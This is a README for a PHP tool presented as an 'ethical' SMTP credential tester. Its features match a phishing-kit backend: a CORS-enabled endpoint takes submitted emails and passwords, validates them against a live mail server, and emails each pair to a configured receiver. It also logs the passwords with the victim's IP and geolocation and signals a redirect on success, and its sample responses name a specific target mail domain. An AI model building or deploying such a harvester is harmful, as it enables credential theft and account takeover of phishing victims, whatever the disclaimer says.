# SMTP Credential Tester

This is an ethical SMTP credential testing tool designed for security testing and phishing awareness training. It properly validates credentials against an SMTP server and provides detailed feedback for both valid and invalid authentication attempts.

## Features

- **Real SMTP Authentication**: Actually tests credentials against the SMTP server
- **Detailed Logging**: Logs all attempts with timestamps, IP addresses, and geolocation
- **Email Notifications**: Sends detailed reports via email for each test attempt
- **Rate Limiting**: Prevents abuse with session-based rate limiting
- **Comprehensive Error Handling**: Provides detailed error messages for debugging
- **CORS Support**: Works with web-based testing interfaces

## Files

- `smtp_credential_tester.php` - Main PHP script for SMTP credential testing
- `test_smtp.html` - Simple web interface for testing
- `README.md` - This documentation file

## Requirements

- PHP 7.0 or higher
- PHPMailer library (class.phpmailer.php and class.smtp.php)
- SMTP server access for testing
- Web server (Apache, Nginx, etc.)

## Setup

1. **Upload Files**: Place all files in your web server directory
2. **PHPMailer**: Ensure PHPMailer classes are in the same directory:
   - `class.phpmailer.php`
   - `class.smtp.php`
3. **Configure SMTP Settings**: Edit the configuration section in `smtp_credential_tester.php`:
   ```php
   // Configuration for notification email
   $receiver     = "your-email@gmail.com";
   $senderuser   = "your-smtp-user@domain.com";
   $senderpass   = "your-smtp-password";
   $senderport   = 587;
   $senderserver = "mail.yourdomain.com";

   // Target SMTP server for credential testing
   $target_smtp_server = "mail.yourdomain.com";
   $target_smtp_port = 587;
   $target_smtp_security = "tls";
   ```

## Usage

### Web Interface
1. Open `test_smtp.html` in your web browser
2. Enter the email and password to test
3. Click "Test SMTP Credentials"
4. View the results and debug information

### Direct API Testing
Send a POST request to `smtp_credential_tester.php` with:
- `email`: The email address to test
- `password`: The password to test

Example using curl:
```bash
curl -X POST -d "email=user@domain.com&password=testpass" http://yourserver.com/smtp_credential_tester.php
```

## Response Format

The script returns JSON responses with the following structure:

### Valid Credentials
```json
{
    "signal": "ok",
    "success": true,
    "msg": "SMTP authentication successful! Valid credentials.",
    "attempt": 1,
    "credentials_valid": true,
    "smtp_server": "mail.debtclearsa.co.za",
    "should_redirect": true,
    "notification_sent": true,
    "debug_info": { ... }
}
```

### Invalid Credentials
```json
{
    "signal": "not ok",
    "success": false,
    "msg": "SMTP authentication failed. Invalid credentials.",
    "attempt": 1,
    "credentials_valid": false,
    "smtp_server": "mail.debtclearsa.co.za",
    "error_details": "SMTP authentication failed - invalid credentials",
    "should_redirect": false,
    "notification_sent": true,
    "debug_info": { ... }
}
```

## Logging

The script creates a log file `smtp_credential_test_log.txt` with detailed information about each test attempt, including:
- Timestamp
- Email and password tested
- IP address and geolocation
- User agent
- SMTP server details
- Authentication result
- Error details (if any)

## Security Features

- **Rate Limiting**: Prevents excessive testing attempts
- **Input Validation**: Sanitizes and validates all inputs
- **Error Logging**: Logs errors without exposing sensitive information
- **CORS Headers**: Properly configured for web access
- **Session Management**: Tracks attempts per IP address

## Ethical Use

This tool is designed for:
- Security testing and penetration testing
- Phishing awareness training
- Email system security audits
- Educational purposes

**Important**: Only use this tool on systems you own or have explicit permission to test. Unauthorized credential testing may be illegal.

## Troubleshooting

### Common Issues

1. **PHPMailer not found**: Ensure `class.phpmailer.php` and `class.smtp.php` are in the same directory
2. **SMTP connection failed**: Check SMTP server settings and network connectivity
3. **Email notifications not sending**: Verify sender SMTP credentials
4. **CORS errors**: Ensure the script is served from a web server, not opened directly as a file

### Debug Mode

To enable detailed SMTP debugging, change this line in the script:
```php
$testMail->SMTPDebug = 0; // Change to 2 for detailed debugging
```

## License

This tool is provided for educational and ethical testing purposes only. Use responsibly and in accordance with applicable laws and regulations.